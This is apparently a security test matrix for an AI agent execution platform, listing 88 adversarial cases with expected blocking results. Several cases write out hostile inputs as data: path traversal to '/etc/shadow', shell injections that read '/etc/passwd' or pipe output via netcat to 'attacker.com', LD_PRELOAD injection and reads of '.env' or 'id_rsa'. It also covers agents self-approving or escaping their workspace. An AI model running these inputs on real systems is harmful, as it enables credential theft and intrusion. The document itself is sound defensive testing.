# TACP Phase 2 Security Test Matrix (88 Cases)

**Document:** `docs/testing/PHASE-2-SECURITY-MATRIX.md`  
**Phase:** Phase 2 — Governed Execution Platform (Gate A Architecture)  
**Security Lead:** Antigravity Principal Security Engineer  
**Date:** September 11, 2026  

---

## 1. Scope & Adversarial Standard

In accordance with Phase 2 Master Specification Part LV, this matrix defines **88 mandatory adversarial security test cases** across 9 threat domains. 

Every case represents an intentional attack or boundary failure that TACP must detect, block, and log without crashing or compromising security invariants.

---

## 2. The 88 Security Test Cases

### Category 1: Path Security & Jailbreak Defenses (Cases 1 - 15)
- **SEC-01**: `../` relative traversal attempt in patch target path $\to$ Blocked with `OUTSIDE_WORKSPACE`
- **SEC-02**: Deep directory traversal (`../../../../etc/shadow`) $\to$ Blocked with `OUTSIDE_WORKSPACE`
- **SEC-03**: Absolute path escape (`/data/data/com.termux/files/home/.bashrc`) $\to$ Blocked
- **SEC-04**: Mixed path separators (`src\\sub/file.py`) $\to$ Normalized and verified inside jail
- **SEC-05**: Redundant separators (`src///sub//file.py`) $\to$ Collapsed and jailed
- **SEC-06**: Dot-segment normalization tricks (`src/./sub/../file.py`) $\to$ Canonicalized
- **SEC-07**: Null byte injection in filename (`file.py\0.txt`) $\to$ Rejected with `INVALID_PATH`
- **SEC-08**: Symlink dereference pointing to outside file $\to$ Target verified; blocked
- **SEC-09**: Nested symlink chain escaping workspace root $\to$ All hops validated; blocked
- **SEC-10**: Broken symlink targeting nonexistent outside path $\to$ Blocked gracefully
- **SEC-11**: Circular symlink loop $\to$ Max hop count exceeded; fails safely without infinite loop
- **SEC-12**: Sibling workspace escape (`../workspace_b/file.txt`) $\to$ Blocked (different root)
- **SEC-13**: Prefix collision attack (`/path/to/ws` vs `/path/to/ws_evil`) $\to$ Trailing slash enforced
- **SEC-14**: Unicode normalization collision (NFC vs NFD) $\to$ Normalized to NFC
- **SEC-15**: Concurrent path race (symlink swapped mid-resolution) $\to$ Inode / fd verify

### Category 2: Mutation Security & Integrity (Cases 16 - 26)
- **SEC-16**: Unauthorized write in read-only mode $\to$ Rejected with `READ_ONLY_VIOLATION`
- **SEC-17**: Unauthorized patch proposal lacking capability lease $\to$ Rejected with `NOT_AUTHORIZED`
- **SEC-18**: Patch submitted against inactive or unregistered workspace $\to$ Rejected
- **SEC-19**: Patch execution attempted with expired approval ticket $\to$ Rejected with `APPROVAL_EXPIRED`
- **SEC-20**: Forged or tampered approval signature/ID $\to$ Rejected with `INVALID_APPROVAL`
- **SEC-21**: Patch initiated by unauthenticated or suspended principal $\to$ Rejected
- **SEC-22**: Stale resource mutation (file deleted before patch) $\to$ Rejected with `NOT_FOUND`
- **SEC-23**: Concurrent modification during patch dry-run $\to$ Detected via `base_checksum` mismatch
- **SEC-24**: Checksum mismatch between client request and disk $\to$ Fails with `CONFLICT`
- **SEC-25**: Interrupted write simulation (temp file orphaned) $\to$ Target file untouched
- **SEC-26**: Post-verification failure (disk hash != predicted) $\to$ Snapshot restored atomically

### Category 3: Command Security & Injection Defenses (Cases 27 - 38)
- **SEC-27**: Semicolon command injection (`ls; cat /etc/passwd`) $\to$ Passed as literal argument
- **SEC-28**: Pipe redirection injection (`ls | nc attacker.com 4444`) $\to$ Passed as literal argument
- **SEC-29**: Shell backtick / expansion injection (`` `id` ``, `$(id)`) $\to$ Not expanded by subshell
- **SEC-30**: Malicious environment variable injection (`LD_PRELOAD=/evil.so`) $\to$ Filtered out
- **SEC-31**: PATH poisoning attack (prepending `./bin` to PATH) $\to$ Fixed immutable system PATH
- **SEC-32**: Malicious working directory outside workspace $\to$ Blocked by jail validation
- **SEC-33**: Interpreter abuse (`python -c "import os; os.system(...)"`) $\to$ Governed by policy
- **SEC-34**: Invocation of dangerous root executable (`su`, `sudo`) $\to$ Blocked by constitutional deny
- **SEC-35**: Timeout bypass attempt (infinite loop process) $\to$ Process group killed via `SIGKILL`
- **SEC-36**: Output buffer flooding (infinite stream `cat /dev/zero`) $\to$ Truncated at buffer limit
- **SEC-37**: Process-tree fork bomb attack $\to$ Child process limit enforced by governor
- **SEC-38**: Stdin buffer injection / pipe deadlock $\to$ Explicit EOF / timeout on stdin

### Category 4: Authorization & Policy Hierarchy (Cases 39 - 48)
- **SEC-39**: Request for non-existent capability $\to$ Fails closed with `UNKNOWN_CAPABILITY`
- **SEC-40**: Request targeting un-cataloged resource URI $\to$ Fails closed with `UNKNOWN_RESOURCE`
- **SEC-41**: Evaluation when policy record is missing $\to$ Defaults to `DENY`
- **SEC-42**: Evaluation of ambiguous or conflicting rules $\to$ Fails closed with `REQUIRE_APPROVAL`
- **SEC-43**: Workspace policy attempting to override Platform policy $\to$ Compilation rejected
- **SEC-44**: AI Agent attempting to self-approve an operation $\to$ Rejected (Human required)
- **SEC-45**: Attempt to reuse a consumed single-use approval $\to$ Rejected with `APPROVAL_ALREADY_USED`
- **SEC-46**: Operation attempted with expired capability lease $\to$ Rejected with `LEASE_EXPIRED`
- **SEC-47**: Agent A attempting to access/cancel Agent B's job $\to$ Blocked with `NOT_AUTHORIZED`
- **SEC-48**: Agent attempting to execute in workspace without registration $\to$ Blocked

### Category 5: Secret Security & Information Leakage (Cases 49 - 56)
- **SEC-49**: Direct read of `.env` or `id_rsa` file $\to$ Blocked with `SECRET_PROTECTED`
- **SEC-50**: Attempt to write/patch secret file $\to$ Blocked with `SECRET_PROTECTED`
- **SEC-51**: API key in command stdout $\to$ Redacted to `[REDACTED_API_KEY]` before return
- **SEC-52**: Database password in error message $\to$ Redacted before returning to caller
- **SEC-53**: Sensitive token passed in MCP argument $\to$ Redacted before logging in audit trail
- **SEC-54**: Secret credential in child process stderr $\to$ Redacted before model ingestion
- **SEC-55**: Output artifact containing private token $\to$ Scanned and scrubbed
- **SEC-56**: Process environment dump (`env`, `export`) $\to$ Redacted against secret patterns

### Category 6: Network Security & SSRF Defenses (Cases 57 - 62)
- **SEC-57**: Network egress to unauthorized domain $\to$ Blocked by domain allowlist
- **SEC-58**: Egress targeting RFC 1918 private IP (`192.168.1.1`) $\to$ Blocked (SSRF guard)
- **SEC-59**: Egress targeting local loopback (`127.0.0.1:8080`) $\to$ Blocked (SSRF guard)
- **SEC-60**: HTTP redirect from allowed domain to private IP $\to$ Redirect re-evaluated and blocked
- **SEC-61**: DNS resolution timeout / failure $\to$ Fails closed
- **SEC-62**: Outbound payload exceeding transfer limit (50 MB) $\to$ Transfer aborted

### Category 7: MCP Protocol & Interface Security (Cases 63 - 72)
- **SEC-63**: Malformed JSON-RPC request syntax $\to$ Returns `-32700 Parse error`
- **SEC-64**: Parameter type mismatch (integer instead of string) $\to$ Returns `-32602 Invalid params`
- **SEC-65**: Missing mandatory tool argument $\to$ Returns `-32602 Invalid params`
- **SEC-66**: Unexpected extraneous arguments $\to$ Handled safely without parameter injection
- **SEC-67**: Oversized request line (>1 MB) $\to$ Truncated and rejected
- **SEC-68**: Call to unexposed or deprecated tool $\to$ Returns `-32601 Method not found`
- **SEC-69**: Forged `_meta` trace ID or progress token $\to$ Validated and sanitized
- **SEC-70**: Malicious prompt injection payload inside file content $\to$ Treated purely as data
- **SEC-71**: Oversized tool output result $\to$ Truncated to `OutputLimits` cap
- **SEC-72**: Injection of JSON-RPC control sequences in output $\to$ Escaped cleanly

### Category 8: Resource Governor & DoS Defenses (Cases 73 - 80)
- **SEC-73**: File read exceeding 10 MB limit $\to$ Truncated with warning
- **SEC-74**: Directory listing with >10,000 files $\to$ Capped at `max_dir_entries` (1,000)
- **SEC-75**: Glob search explosion (`**/*`) $\to$ Capped at `max_search_results` (100)
- **SEC-76**: Process explosion (rapid spawning) $\to$ Blocked by concurrency governor
- **SEC-77**: Job explosion (creating >50 queued jobs) $\to$ Rejected with `RESOURCE_LIMIT`
- **SEC-78**: Rapid log writing attempting to fill disk $\to$ Rate-limited and rotated
- **SEC-79**: Low disk space condition (<50 MB free) $\to$ Write operations fail closed
- **SEC-80**: Concurrency lock exhaustion $\to$ Queue timeout and clean release

### Category 9: Recovery & Lifecycle Security (Cases 81 - 88)
- **SEC-81**: Daemon crash during file mutation $\to$ Original file verified intact on restart
- **SEC-82**: Daemon restart with pending approval $\to$ Approval retained; valid until expiry
- **SEC-83**: Daemon restart with active lease $\to$ Lease re-validated or expired on startup
- **SEC-84**: Daemon restart with active lock $\to$ Lock reaped if process dead
- **SEC-85**: Daemon restart during running job $\to$ Job reconciled to `FAILED`
- **SEC-86**: Corrupted audit log line injection $\to$ `verify_integrity()` detects tampering
- **SEC-87**: Stale orphan process running in background $\to$ Terminated by process supervisor
- **SEC-88**: Stale task queue entries $\to$ Reconciled by startup doctor
